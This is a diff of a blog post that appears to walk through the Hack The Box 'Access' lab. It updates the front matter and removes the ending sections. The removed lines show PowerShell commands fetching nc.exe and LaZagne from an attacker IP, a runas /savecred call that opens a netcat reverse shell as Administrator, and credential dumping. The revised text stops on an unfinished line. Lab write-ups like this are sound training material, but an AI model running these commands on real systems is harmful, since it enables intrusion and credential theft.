@@ -1,12 +1,15 @@
 +++
-tags = ["Box", "HTB", "Easy", "Windows", "pst", "lnk", "telnet", "Active Directory"]
+title = "Access HTB Walkthrough: PST Files, LNK Exploitation, and Stored Credentials"
 draft = false
-title = "Access HTB Walkthrough"
-date = 2024-09-12
+tags = ["Windows", "HTB", "Hack The Box", "PST Files", "LNK Files", "Telnet", "Active Directory", "Stored Credentials", "Windows Security", "Privilege Escalation", "FTP", "Microsoft Access", "Database Security"]
+keywords = ["Hack The Box Access", "Windows stored credentials exploitation", "PST file analysis", "LNK file vulnerabilities", "runas savecred exploitation", "Windows privilege escalation", "Microsoft Access database security", "telnet enumeration", "FTP anonymous access", "Windows security assessment"]
+description = "A comprehensive walkthrough of the Access machine from Hack The Box, covering PST file analysis, LNK file exploitation, and stored credential attacks. Learn about Windows security mechanisms, database enumeration, and privilege escalation techniques using saved credentials."
 author = "bloodstiller"
+date = 2024-09-12
 toc = true
 bold = true
 next = true
+lastmod = 2024-09-12
 +++
 
 
@@ -414,67 +417,4 @@ Nmap done: 1 IP address (1 host up) scanned in 382.99 seconds
         1.  Tells us it is a `lnk` file for the ZKAccess3.5 binary.
         2.  We can see "`runas.exe`" is being used.
         3.  We can see the parmaters for the lnk file when it was created are:
-            -   "`/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"`"
-        4.  The SID is the `500` sid which is the Administrator built in default account &amp; SID so we know it is 100% running in the context of that user when triggered.
-    -   This means we can run any command in the context of the Administrator.
-
-
-## 4. Ownership: {#4-dot-ownership}
-
-Now that we know our privesc path I transfer my nc binary over to the host:
-
--   **Transfer nc binary**:
-    -   `powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.29:9000/nc.exe','C:\Users\Security\nc.exe')"`
-        -   {{< figure src="/ox-hugo/2024-09-12-063330_.png" >}}
--   **Setup my listener**: on my own host:
-    -   `nc -nvlp 9999`
--   **Trigger the exploit by running nc in the context of the administrator**:
-    -   `runas /user:ACCESS\Administrator /savecred "C:\Users\security\nc.exe 10.10.14.29 9999 -e cmd"`
-        -   {{< figure src="/ox-hugo/2024-09-12-063303_.png" >}}
--   **Get my root shell**:
-    -   {{< figure src="/ox-hugo/2024-09-12-063246_.png" >}}
-
--   **Get the flag**:
-    -   {{< figure src="/ox-hugo/2024-09-12-075636_.png" >}}
-
-
-## 5. Persistence: {#5-dot-persistence}
-
--   **I transfer LaZagne.exe over to the host**:
-    -   <https://github.com/AlessandroZ/LaZagne>
-    -   `powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.29:9000/LaZagne.exe','C:\Users\Security\lz.exe')"`
-
-    -   **I then run it and extract the hashes**:
-        -   {{< figure src="/ox-hugo/2024-09-12-081330_.png" >}}
-
-    -   **I also get the clear text password for the Administrator user**:
-        -   {{< figure src="/ox-hugo/2024-09-12-081604_.png" >}}
-
-    -   **I Verify this is correct by checking I can login as that user**:
-        -   {{< figure src="/ox-hugo/2024-09-12-081836_.png" >}}
-        -   I now have persistence.
-
-
-## Lessons Learned: {#lessons-learned}
-
-
-### What did I learn? {#what-did-i-learn}
-
-1.  I learned a lot more `lnk` files and how they hold information.
-2.  I learned how to upgrade the telnet shell (I was not aware that was a thing until now)
-3.  I laerned about `pst` files, I had not encountered them before, so that was new &amp; fun.
-
-
-### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}
-
-1.  Repeatedly trying to use a reverse shell &amp; get nc to work when the GPO was in place.
-
-## Sign off: {#sign-off}
-
-Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!
-
-Until next time, hack the planet!
-
-&#x2013; Bloodstiller
-
-&#x2013; Get in touch bloodstiller at proton dot me
+            -   "`
